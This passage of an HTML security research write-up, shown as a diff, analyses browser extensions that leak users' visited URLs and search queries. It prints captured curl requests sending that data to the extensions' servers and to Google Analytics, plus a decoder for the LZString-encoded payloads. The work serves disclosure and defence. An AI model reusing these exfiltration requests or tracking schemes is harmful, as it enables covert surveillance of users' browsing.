+<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<pre><code>URL param: abr
+{
+  q: &#39;https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dtarget&#39;,
+  link: &#39;https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dprev&#39;,
+  prev: &#39;https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dprev&#39;
+}
+URL param: smt
+{
+  hreferer: &#39;https%3A%2F%2Fwww.google.com%2F&#39;,
+  iow: [ XXXXXX ],
+  tt: &#39;form_submit&#39;
+}
+URL param: urk
+{ meta: &#39;exthead&#39;, ts: XXXXXX, ch: 0 }
+URL param: eov
+{ s: &#39;XXXXXX&#39;, pid: &#39;XXXXXX&#39;, tmv: 6 }
+URL param: hja
+{ md: 21, v: 1, sub: &#39;6.3.4&#39; }
+URL param: nxp
+{ app: &#39;XXXXXX&#39; }</code></pre>
+<h3 id="apkonline-apk-manager-for-android-emulator">ApkOnline APK
+manager for Android emulator</h3>
+<p><code>extension_id: lnhnebkkgjmlgomfkkmkoaefbknopmja</code></p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&#39;https://www.uptoplay.net/media/system/ext/c-2-androidemulator-x-y-2.php?url=68747470...&amp;hex=XXXXXX&amp;u=XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;accept: */*&#39;</span> <span class="dt">\</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;accept-language: en-GB,en-US;q=0.9,en;q=0.8&#39;</span> <span class="dt">\</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;origin: chrome-extension://lnhnebkkgjmlgomfkkmkoaefbknopmja&#39;</span> <span class="dt">\</span></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;priority: u=1, i&#39;</span> <span class="dt">\</span></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-dest: empty&#39;</span> <span class="dt">\</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-mode: cors&#39;</span> <span class="dt">\</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-site: cross-site&#39;</span> <span class="dt">\</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;user-agent: XXXXXX&#39;</span></span></code></pre></div>
+<p>The URL parameter <code>url</code> has hex encoded value that after
+decoding shows <code>https://www.google.com/search?q=target</code>. SO,
+in this case trivial obfuscation.</p>
+<h3 id="similar-sites---discover-related-websites">Similar Sites -
+Discover Related Websites</h3>
+<p><code>extension_id: necpbmbhhdiplmfhmjicabdeighkndkn</code></p>
+<p>This is the same type of exfiltration data as in Similarweb
+extensions.</p>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&#39;https://data-api.similarsites.com/numberOfSimilarSites&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept: */*&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept-Language: en-GB,en-US;q=0.9,en;q=0.8&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Connection: keep-alive&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Content-type: application/x-www-form-urlencoded&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a>  <span class="at">-b</span> <span class="st">&#39;XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Origin: chrome-extension://necpbmbhhdiplmfhmjicabdeighkndkn&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Dest: empty&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Mode: cors&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Site: none&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Storage-Access: active&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;User-Agent: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;hiw8: www.google.com&#39;</span> <span class="dt">\</span></span>
+<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a>  <span class="at">--data-raw</span> <span class="st">&#39;e=q%3Dhttps...&#39;</span></span></code></pre></div>
+<h3 id="video-ad-blocker-plus-for-youtube">Video Ad Blocker Plus for
+YouTube™</h3>
+<p><code>extension_id: hegneaniplmfjcmohoclabblbahcbjoe</code></p>
+<p>In this case the decoding of the payload wasn’t difficult, both keys
+and values are encoded with LZ string UTF16 compression.</p>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&#39;https://safe.videoadblockerplus.com/validate&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept: */*&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept-Language: en-GB,en-US;q=0.9,en;q=0.8&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Connection: keep-alive&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Origin: chrome-extension://hegneaniplmfjcmohoclabblbahcbjoe&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Dest: empty&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Mode: cors&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Site: none&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Storage-Access: active&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;User-Agent: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;bone: www.google.com&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;content-type: application/x-www-form-urlencoded&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-13"><a href="#cb21-13" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;x4fs: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb21-14"><a href="#cb21-14" aria-hidden="true" tabindex="-1"></a>  <span class="at">--data-raw</span> <span class="st">&#39;%E0%A2%A2%E5...&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb22"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> LZString <span class="op">=</span> <span class="pp">require</span>(<span class="st">&#39;lz-string&#39;</span>)<span class="op">;</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> payload <span class="op">=</span> <span class="vs">`%E0%A2%A2%E5...`</span><span class="op">;</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a>payload<span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;&amp;&#39;</span>)<span class="op">.</span><span class="fu">forEach</span>(pair <span class="kw">=&gt;</span> {</span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> parts <span class="op">=</span> pair<span class="op">.</span><span class="fu">split</span>(<span class="ss">/=</span><span class="sc">(</span><span class="ss">.</span><span class="sc">+)</span><span class="ss">/</span>)<span class="op">;</span></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> rawKey <span class="op">=</span> parts[<span class="dv">0</span>]<span class="op">;</span></span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> rawValue <span class="op">=</span> parts[<span class="dv">1</span>]<span class="op">;</span></span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> encodedKey <span class="op">=</span> <span class="pp">decodeURIComponent</span>(rawKey)<span class="op">.</span><span class="fu">trim</span>()<span class="op">;</span></span>
+<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> encodedVal <span class="op">=</span> <span class="pp">decodeURIComponent</span>(rawVal)<span class="op">.</span><span class="fu">trim</span>()<span class="op">;</span></span>
+<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> key <span class="op">=</span> LZString<span class="op">.</span><span class="fu">decompressFromUTF16</span>(encodedKey)<span class="op">;</span></span>
+<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> val <span class="op">=</span> LZString<span class="op">.</span><span class="fu">decompressFromUTF16</span>(encodedVal)<span class="op">;</span></span>
+<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="vs">`</span><span class="sc">${</span>key<span class="sc">}</span><span class="vs">: </span><span class="sc">${</span>val<span class="sc">}</span><span class="vs">`</span>)<span class="op">;</span></span>
+<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<p>The schema used is completely same as in BlockSite extensions,
+further proving those two are linked together.</p>
+<pre><code>&quot;ul&quot;: &quot;https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dtarget&quot;
+&quot;ink&quot;: &quot;https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dprevious&quot;
+&quot;pel&quot;: &quot;https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dprevious&quot;
+&quot;rr&quot;: &quot;https%3A%2F%2Fwww.google.com%2F&quot;
+&quot;dot&quot;: [XXXXXX]
+&quot;strm&quot;: &quot;form_submit&quot;
+&quot;poz&quot;: &quot;exthead&quot;
+&quot;lng&quot;: XXXXXX
+&quot;ch&quot;: 8
+&quot;rm&quot;: &quot;XXXXXX&quot;
+&quot;cas&quot;: &quot;XXXXXX&quot;
+&quot;v3&quot;: 6
+&quot;dis&quot;: 21
+&quot;cm&quot;: 1
+&quot;org&quot;: &quot;1.2.4&quot;
+&quot;info&quot;: &quot;XXXXXX&quot;</code></pre>
+<h3 id="knowee-ai---your-homework-and-essay-helper">Knowee AI - Your
+Homework and Essay Helper</h3>
+<p><code>extension_id: fcejkolobdcfbhhakbhajcflakmnhaff</code></p>
+<p>We selected also this extensions to showcase that the leakage can be
+done also via request headers as it is in this case.</p>
+<div class="sourceCode" id="cb24"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&#39;https://core.knowee.ai/api/users/me&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;accept: */*&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;accept-language: en-GB,en-US;q=0.9,en;q=0.8&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;authorization;&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;channel;&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;client: extension&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a>  <span class="at">-b</span> <span class="st">&#39;XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;device-id: XXXXXXc&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;location: https://www.google.com/search?q=target&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;platform: undefined&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;priority: u=1, i&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;promotion-code;&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-13"><a href="#cb24-13" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-dest: empty&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-14"><a href="#cb24-14" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-mode: cors&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-15"><a href="#cb24-15" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-site: none&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-16"><a href="#cb24-16" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-storage-access: active&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-17"><a href="#cb24-17" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;update-version: 4.2.0&#39;</span> <span class="dt">\</span></span>
+<span id="cb24-18"><a href="#cb24-18" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;user-agent: XXXXXX&#39;</span></span></code></pre></div>
+<h3
+id="super-pip---picture-in-picture-with-playback-controls-and-subtitles">Super
+PiP - Picture-in-Picture with playback controls and subtitles</h3>
+<p><code>extension_id: jjjpjmbnbdjhbkclajpagjkefefnednl</code></p>
+<p>The last exmaple we wanted to include is that GA can be also used for
+data exfiltration where even parameter can be simply visited URL.</p>
+<div class="sourceCode" id="cb25"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&#39;https://www.google-analytics.com/mp/collect?measurement_id=XXXXXX&amp;api_secret=XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;accept: */*&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;accept-language: en-GB,en-US;q=0.9,en;q=0.8&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;content-type: text/plain;charset=UTF-8&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-b</span> <span class="st">&#39;ar_debug=1&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;origin: chrome-extension://jjjpjmbnbdjhbkclajpagjkefefnednl&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;priority: u=1, i&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-8"><a href="#cb25-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-dest: empty&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-9"><a href="#cb25-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-mode: cors&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-10"><a href="#cb25-10" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-site: none&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-11"><a href="#cb25-11" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-storage-access: active&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-12"><a href="#cb25-12" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;user-agent: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb25-13"><a href="#cb25-13" aria-hidden="true" tabindex="-1"></a>  <span class="at">--data-raw</span> <span class="st">&#39;{&quot;client_id&quot;:&quot;XXXXXX&quot;,&quot;events&quot;:[{&quot;name&quot;:&quot;page_view&quot;,&quot;params&quot;:{&quot;trim_version&quot;:&quot;pictureinpicture&quot;,&quot;page_title&quot;:&quot;target - Google Search&quot;,&quot;request_id&quot;:&quot;XXXXXX&quot;,&quot;page_location&quot;:&quot;https://www.google.com/search?q=target&quot;,&quot;page_referrer&quot;:&quot;https://www.google.com/&quot;,&quot;session_id&quot;:&quot;XXXXXX&quot;,&quot;engagement_time_msec&quot;:100}}]}&#39;</span></span></code></pre></div>
+<h2 id="support-us">Support us</h2>
+<p>If you like what we did and you would like to see further research on
+web extensions, mobile apps or on vscode extensions. Consider supporting
+us. This research was very time intensive.</p>
+<pre><code>XMR: 8AGJ7g1fhvs5Uw7BkCvEY4ZpYyUxCXtMU6EdftqKkgSdgz4w8iXtmYceL9CSJPKvrJEibhFNQGnp6ZErjdjvGdHJKhQo8Q7
+BTC: bc1q34v2rx9kxpteck83j95a8dqe889cmfmgx0ay7q</code></pre>
+<p><img
+src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAD6CAMAAAB50mmfAAAC2WlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNi4wLjAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyIKICAgICAgICAgICAgeG1sbnM6ZXhpZj0iaHR0cDovL25zLmFkb2JlLmNvbS9leGlmLzEuMC8iPgogICAgICAgICA8dGlmZjpZUmVzb2x1dGlvbj4xNDQ8L3RpZmY6WVJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOlJlc29sdXRpb25Vbml0PjI8L3RpZmY6UmVzb2x1dGlvblVuaXQ+CiAgICAgICAgIDx0aWZmOlhSZXNvbHV0aW9uPjE0NDwvdGlmZjpYUmVzb2x1dGlvbj4KICAgICAgICAgPHRpZmY6T3JpZW50YXRpb24+MTwvdGlmZjpPcmllbnRhdGlvbj4KICAgICAgICAgPGV4aWY6UGl4ZWxYRGltZW5zaW9uPjE0NDA8L2V4aWY6UGl4ZWxYRGltZW5zaW9uPgogICAgICAgICA8ZXhpZjpVc2VyQ29tbWVudD5TY3JlZW5zaG90PC9leGlmOlVzZXJDb21tZW50PgogICAgICAgICA8ZXhpZjpQaXhlbFlEaW1lbnNpb24+MTQxMDwvZXhpZjpQaXhlbFlEaW1lbnNpb24+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgoFWC2QAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAA/UExURQgBBP///74rLCgMEp0gINE6OjQhJYFeVGlJQm8UFpVxZvfw79uhmU80MqY7PM+Ohrh8dNq0sebR0MxbWqaTjs5iwXIA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